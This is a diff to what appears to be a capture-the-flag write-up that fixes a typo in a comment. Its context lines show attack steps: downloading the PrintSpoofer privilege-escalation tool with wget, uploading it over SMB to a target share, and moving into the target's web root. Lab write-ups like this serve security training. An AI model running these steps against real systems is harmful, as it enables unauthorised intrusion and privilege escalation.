@@ -19,7 +19,7 @@ more c:\users\bob\desktop\user.txt
 ## Flag 2
 
 ``` sh
-wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe ## PrintSpoofer32.exe didnt work
+wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe ## PrintSpoofer32.exe didn't work
 smbclient \\\\10.10.96.94\\nt4wrksv
 put PrintSpoofer64.exe
 cd C:\inetpub\wwwroot\nt4wrksv
